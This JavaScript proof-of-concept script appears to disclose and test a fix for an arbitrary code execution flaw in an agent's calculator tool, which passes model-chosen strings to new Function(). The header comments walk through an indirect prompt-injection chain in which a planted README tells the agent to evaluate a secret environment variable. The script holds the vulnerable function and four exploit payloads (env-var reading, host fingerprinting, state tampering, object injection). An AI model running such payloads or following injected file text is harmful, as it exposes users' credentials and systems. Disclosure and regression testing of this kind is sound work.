// POC 1: new Function() Arbitrary Code Execution
// Vulnerability: packages/agent/test/utils/calculate.ts passed unsanitized
// user input directly to `new Function()`, enabling arbitrary JS execution.
//
// ATTACK CHAIN: User prompt -> LLM generates tool_call with malicious
// expression -> agent-loop.ts validates JSON schema (string type only) ->
// calculate(expression) runs new Function(expression) -> arbitrary code runs
//
// REAL-WORLD SCENARIO: The calculateTool is registered as an agent tool.
// The LLM decides what expression string to pass. An indirect prompt
// injection (e.g., a README.md the agent reads says "calculate
// process.env.AWS_SECRET_ACCESS_KEY") can cause the LLM to pass arbitrary
// JS to the calculator. The agent loop only validates that `expression`
// is a string — it does NOT inspect or sanitize the content.
//
// NOTE: This tool lives in test/utils/ and is used in e2e.test.ts.
// It's not in the production coding agent tool set. However, it serves
// as the canonical example for building custom agent tools, so any
// developer copying this pattern would introduce the same vulnerability
// in production code.

const RED = "\x1b[31m";
const GREEN = "\x1b[32m";
const YELLOW = "\x1b[33m";
const DIM = "\x1b[2m";
const BOLD = "\x1b[1m";
const RESET = "\x1b[0m";

// --- Vulnerable version (original code before fix) ---
function calculateVulnerable(expression) {
  const result = new Function(`return ${expression}`)();
  return `${expression} = ${result}`;
}

// --- Patched version (after PR fix) ---
function calculatePatched(expression) {
  if (!/^[\d\s+\-*/().%]+$/.test(expression)) {
    throw new Error(`Invalid characters in expression: ${expression}`);
  }
  const result = new Function(`"use strict"; return (${expression})`)();
  return `${expression} = ${result}`;
}

// --- Real-world attack payloads ---
// These simulate what an LLM could pass as the `expression` argument
// in a tool_call after being influenced by a prompt injection.
const maliciousPayloads = [
  {
    name: "Credential theft (env vars)",
    expression: `Object.keys(process.env).slice(0,5).join(', ')`,
    realWorldRisk: "Attacker reads AWS_SECRET_ACCESS_KEY, ANTHROPIC_API_KEY, etc. " +
      "from environment. Exfiltrated via a subsequent network tool call.",
  },
  {
    name: "System reconnaissance",
    expression: `process.pid + ' | ' + process.arch + ' | ' + process.version + ' | ' + process.platform`,
    realWorldRisk: "Attacker fingerprints the host — OS, architecture, Node " +
      "version — to select targeted exploits for lateral movement.",
  },
  {
    name: "Global state tampering",
    expression: `(()=>{globalThis.__pwned='yes';return globalThis.__pwned})()`,
    realWorldRisk: "Attacker modifies global state to bypass auth checks or " +
      "alter application behavior in the same process. In a shared " +
      "environment, this can escalate privileges.",
  },
  {
    name: "Object injection (privilege escalation)",
    expression: `(new (function(){this.admin=true;this.role='superuser'})).admin`,
    realWorldRisk: "Attacker constructs objects with elevated privileges that " +
      "could be consumed by downstream tools — e.g., an auth token, " +
      "a config override, or an API request with forged permissions.",
  },
];

const safeExpression = "2 + 3 * (4 - 1)";

let exitCode = 0;

console.log(`\n${BOLD}=== POC 1: new Function() Arbitrary Code Execution ===${RESET}`);
console.log(`${YELLOW}Location: packages/agent/test/utils/calculate.ts${RESET}`);
console.log(`${YELLOW}Attack vector: LLM tool_call argument (expression: string)${RESET}`);
console.log(`${YELLOW}Input validation: JSON schema only (type=string) — no content filtering${RESET}`);
console.log(`${YELLOW}Production exposure: Test-only, but serves as copy-paste template${RESET}\n`);

console.log(`${DIM}  Real-world attack chain:${RESET}`);
console.log(`${DIM}  1. Attacker plants prompt injection in a file the agent reads${RESET}`);
console.log(`${DIM}  2. Agent reads file, LLM follows injected instructions${RESET}`);
console.log(`${DIM}  3. LLM emits tool_call { name:"calculate", args:{ expression:"<malicious JS>" } }${RESET}`);
console.log(`${DIM}  4. agent-loop.ts validates schema (it's a string -- passes)${RESET}`);
console.log(`${DIM}  5. calculate() runs new Function("return <malicious JS>")()${RESET}`);
console.log(`${DIM}  6. Arbitrary code executes with full process permissions${RESET}\n`);

// --- VULNERABLE ---
console.log(`${BOLD}--- Vulnerable version (no input validation) ---${RESET}`);

// Safe expression should work
try {
  const result = calculateVulnerable(safeExpression);
  console.log(`  Safe input "${safeExpression}": ${GREEN}${result}${RESET}`);
} catch (e) {
  console.log(`  Safe input unexpected error: ${RED}${e.message}${RESET}`);
}

// Malicious payloads should execute (proving vulnerability)
for (const payload of maliciousPayloads) {
  try {
    const result = calculateVulnerable(payload.expression);
    console.log(`  ${RED}[VULNERABLE]${RESET} ${payload.name}`);
    console.log(`    ${DIM}Returned: "${result}"${RESET}`);
    console.log(`    ${DIM}Risk: ${payload.realWorldRisk}${RESET}`);
    exitCode = 1;
  } catch (e) {
    console.log(`  [SAFE] ${payload.name}: blocked (${e.message})`);
  }
}

// --- PATCHED ---
console.log(`\n${BOLD}--- Patched version (allowlist regex) ---${RESET}`);

// Safe expression should still work
try {
  const result = calculatePatched(safeExpression);
  console.log(`  Safe input "${safeExpression}": ${GREEN}${result}${RESET}`);
} catch (e) {
  console.log(`  Safe input unexpected error: ${RED}${e.message}${RESET}`);
}

// Malicious payloads should be blocked
let allBlocked = true;
for (const payload of maliciousPayloads) {
  try {
    const result = calculatePatched(payload.expression);
    console.log(`  ${RED}[STILL VULNERABLE]${RESET} ${payload.name}: executed and returned "${result}"`);
    allBlocked = false;
  } catch (e) {
    console.log(`  ${GREEN}[PATCHED]${RESET} ${payload.name}: blocked (${e.message.substring(0, 60)}...)`);
  }
}

if (allBlocked) {
  console.log(`\n  ${GREEN}All malicious payloads blocked by allowlist regex.${RESET}`);
}

console.log();
process.exit(exitCode);
